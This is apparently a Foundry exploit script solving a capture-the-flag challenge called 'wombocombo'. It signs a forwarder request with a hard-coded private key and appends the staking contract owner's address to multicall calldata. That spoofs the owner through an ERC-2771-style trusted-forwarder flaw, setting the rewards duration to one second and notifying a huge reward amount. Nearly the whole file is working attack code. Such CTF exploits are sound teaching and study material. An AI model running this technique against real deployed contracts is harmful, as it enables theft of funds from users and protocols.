// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {ECDSA} from "openzeppelin/utils/cryptography/ECDSA.sol";
import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "../src/wombocombo/Challenge.sol";
import {Staking} from "../src/wombocombo/Staking.sol";
import {Forwarder} from "../src/wombocombo/Forwarder.sol";
import {Token} from "../src/wombocombo/Token.sol";

contract ExploitScript is Script {
    uint256 privateKey =
        uint256(
            0xf2943da254bbe913381bb5fe4ae3367316fe4f0c0f244b313fb69a500ebc5798
        );
    address player = address(0x5A8007b147dB6dC6d067cDE329d4a07557aD1c62);
    Challenge public challenge;
    Token public token;
    Token public reward;
    Forwarder public forwarder;
    Staking public staking;

    function setUp() public {
        challenge = Challenge(0x54B0b1a91F529D6E5C6C53DC10D80b79b04F0F98);
        staking = challenge.staking();
        forwarder = challenge.forwarder();
        token = staking.stakingToken();
        reward = staking.rewardsToken();
    }

    function run() public {
        vm.startBroadcast();

        token.approve(address(staking), 100 * 10 ** 18);
        staking.stake(100 * 10 ** 18);

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodePacked(
            abi.encodeWithSelector(
                staking.setRewardsDuration.selector,
                uint256(1)
            ),
            staking.owner()
        );
        multicallData[1] = abi.encodePacked(
            abi.encodeWithSelector(
                staking.notifyRewardAmount.selector,
                uint256(100_000_000 * 10 ** 18)
            ),
            abi.encodePacked(staking.owner())
        );
        bytes memory muticallEncoded = abi.encodeWithSelector(
            staking.multicall.selector,
            multicallData
        );
        bytes32 _FORWARDREQUEST_TYPEHASH = keccak256(
            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
        );
        bytes32 sturctHash = keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                player,
                address(staking),
                uint256(0),
                uint256(1200000),
                uint256(0),
                uint256(999999999999),
                keccak256(muticallEncoded)
            )
        );
        bytes32 hashedData = _hashTypedDataV4(sturctHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hashedData);
        bytes memory signature = abi.encodePacked(r, s, v);
        forwarder.execute(
            Forwarder.ForwardRequest(
                player,
                address(staking),
                uint256(0),
                uint256(1200000),
                uint256(0),
                uint256(999999999999),
                muticallEncoded
            ),
            signature
        );
        vm.stopBroadcast();
    }

    function _hashTypedDataV4(
        bytes32 structHash
    ) internal view virtual returns (bytes32) {
        return
            ECDSA.toTypedDataHash(
                _buildDomainSeparator(
                    keccak256(
                        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                    ),
                    keccak256(bytes("Forwarder")),
                    keccak256(bytes("1"))
                ),
                structHash
            );
    }

    function _buildDomainSeparator(
        bytes32 typeHash,
        bytes32 nameHash,
        bytes32 versionHash
    ) private view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    typeHash,
                    nameHash,
                    versionHash,
                    block.chainid,
                    address(forwarder)
                )
            );
    }
}
